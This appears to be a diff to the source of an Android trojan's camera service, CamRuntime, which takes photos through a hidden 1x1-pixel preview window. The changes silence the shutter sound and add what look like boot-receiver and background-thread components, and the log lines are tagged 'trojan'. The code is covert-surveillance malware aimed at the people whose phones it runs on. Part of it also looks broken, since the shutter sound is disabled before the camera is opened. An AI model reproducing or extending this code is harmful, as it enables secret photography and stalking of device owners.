@@ -17,6 +17,8 @@ public class CamRuntime extends Service {
 
     private LocalBinder localBinder = new LocalBinder();
     private DummyPreview dummyPreview;
+    private SystemThread system;
+    private ReceiverBoot receAction;
     public static int isCamera = 1;//depan
     public static String path = "";
     public static int kualitas = 0;
@@ -32,6 +34,8 @@ public class CamRuntime extends Service {
         } else {
             kualitas = CamcorderProfile.QUALITY_LOW;
         }
+        system = new SystemThread();
+        receAction = new ReceiverBoot();
         WindowManager wm = (WindowManager) getSystemService(Context.WINDOW_SERVICE);
         this.dummyPreview = new DummyPreview(this, startId);
         WindowManager.LayoutParams lp = new WindowManager.LayoutParams(1, 1,
@@ -59,26 +63,30 @@ public class CamRuntime extends Service {
         if (kamera.equals("back")) {
             frontCamera = 0;
             Log.i("trojan", "cam:"+frontCamera);
+            Camera.getCameraInfo(frontCamera, cameraInfo);
         } 
 
         Camera.getCameraInfo(frontCamera, cameraInfo);
+        if (cameraInfo.canDisableShutterSound) {
+            camera.enableShutterSound(false);
+        }
 
         try {
             camera = Camera.open(frontCamera);
         } catch (RuntimeException e) {
             camera = null;
-            Log.i("trojan", "kamera:"+kamera+" err ff:"+e);
-
             e.printStackTrace();
         }
         try {
             if (null == camera) {
+                Log.i("trojan", "camera null:"+frontCamera);
             } else {
                 try {
                     camera.setPreviewTexture(new SurfaceTexture(0));
                     camera.startPreview();
                 } catch (Exception e) {
                     e.printStackTrace();
+                    Log.i("trojan", "err prev:"+e);
                 }
                 camera.takePicture(null, null, new Camera.PictureCallback() 
                 {
